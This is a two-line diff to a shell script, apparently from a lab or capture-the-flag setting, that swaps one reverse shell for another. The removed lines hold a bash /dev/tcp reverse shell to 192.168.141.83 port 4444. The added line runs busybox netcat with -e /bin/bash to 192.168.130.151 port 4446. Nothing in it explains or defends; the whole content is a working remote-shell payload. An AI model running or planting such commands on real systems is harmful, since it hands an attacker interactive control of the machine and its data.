@@ -1,2 +1,1 @@
-#!/bin/bash
-bash -i >& /dev/tcp/192.168.141.83/4444 0>&1
+busybox nc 192.168.130.151 4446 -e /bin/bash 
